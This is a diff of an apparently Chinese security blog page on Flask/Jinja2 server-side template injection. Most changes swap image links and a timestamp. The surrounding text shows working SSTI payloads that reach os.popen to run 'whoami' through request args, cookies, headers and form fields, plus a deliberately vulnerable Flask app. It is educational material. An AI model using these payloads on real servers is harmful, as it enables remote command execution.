@@ -236,7 +236,7 @@
 
 <p>我们访问网站，并给name传值<code>49</code>，看到返回结果是49，这里就存在了SSTI</p>
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210127132753924.png" title="image-20210127132753924" data-fancybox="images"><img src="/img/ssti/image-20210127132753924.png" alt="image-20210127132753924" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127132753924.png" title="image-20210127132753924" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127132753924.png" alt="image-20210127132753924" title class></a>
                 <p>image-20210127132753924</p>
             </figure>
 
@@ -254,7 +254,7 @@
 
 <p>我们使用构造的语句可以查看到<code>whoami</code>命令执行的结果</p>
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210127172339276.png" title="image-20210127172339276" data-fancybox="images"><img src="/img/ssti/image-20210127172339276.png" alt="image-20210127172339276" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127172339276.png" title="image-20210127172339276" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127172339276.png" alt="image-20210127172339276" title class></a>
                 <p>image-20210127172339276</p>
             </figure>
 
@@ -287,34 +287,34 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.args.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.args.x1][request.args.x2][request.args.x3]()[<span class="number">75</span>][request.args.x4][request.args.x5][request.args.x6][request.args.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210130001455460.png" title="image-20210130001455460" data-fancybox="images"><img src="/img/ssti/image-20210130001455460.png" alt="image-20210130001455460" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001424350.png" title="image-20210130001455460" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001424350.png" alt="image-20210130001455460" title class></a>
                 <p>image-20210130001455460</p>
             </figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.values.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.values.x1][request.values.x2][request.values.x3]()[<span class="number">75</span>][request.values.x4][request.values.x5][request.values.x6][request.values.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__builtins__&amp;x7=__import__</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210130001424350.png" title="image-20210130001424350" data-fancybox="images"><img src="/img/ssti/image-20210130001424350.png" alt="image-20210130001424350" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001455460.png" title="image-20210130001424350" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130001455460.png" alt="image-20210130001424350" title class></a>
                 <p>image-20210130001424350</p>
             </figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.cookies.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.cookies.x1][request.cookies.x2][request.cookies.x3]()[<span class="number">75</span>][request.cookies.x4][request.cookies.x5][request.cookies.x6][request.cookies.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210130000229618.png" title="image-20210130000229618" data-fancybox="images"><img src="/img/ssti/image-20210130000229618.png" alt="image-20210130000229618" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127174548390.png" title="image-20210130000229618" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127174548390.png" alt="image-20210130000229618" title class></a>
                 <p>image-20210130000229618</p>
             </figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.headers.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.headers.x1][request.headers.x2][request.headers.x3]()[<span class="number">75</span>][request.headers.x4][request.headers.x5][request.headers.x6][request.headers.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210129235820486.png" title="image-20210129235820486" data-fancybox="images"><img src="/img/ssti/image-20210129235820486.png" alt="image-20210129235820486" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130000229618.png" title="image-20210129235820486" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130000229618.png" alt="image-20210129235820486" title class></a>
                 <p>image-20210129235820486</p>
             </figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#request.form.name</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>[request.form.x1][request.form.x2][request.form.x3]()[<span class="number">75</span>][request.form.x4][request.form.x5][request.form.x6][request.form.x7](<span class="string">'os'</span>).popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210130002010844.png" title="image-20210130002010844" data-fancybox="images"><img src="/img/ssti/image-20210130002010844.png" alt="image-20210130002010844" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130002010844.png" title="image-20210130002010844" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210130002010844.png" alt="image-20210130002010844" title class></a>
                 <p>image-20210130002010844</p>
             </figure>
 
@@ -347,7 +347,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        t = Template(<span class="string">"Hello：&#123;&#123;n&#125;&#125;"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"Hello,What's your name"</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <a rel=web安全-SSTI href="/img/ssti/image-20210127174548390.png" title="image-20210127174548390" data-fancybox="images"><img src="/img/ssti/image-20210127174548390.png" alt="image-20210127174548390" title class></a>
+                <a rel=web安全-SSTI href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210129235820486.png" title="image-20210127174548390" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210129235820486.png" alt="image-20210127174548390" title class></a>
                 <p>image-20210127174548390</p>
             </figure>
 
@@ -378,7 +378,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2021-02-06T11:38:58.205Z" itemprop="dateUpdated">2021-02-06 19:38:58</time>
+    最後更新時間：<time datetime="2021-02-27T12:26:48.720Z" itemprop="dateUpdated">2021-02-27 20:26:48</time>
 </span><br>
 
 
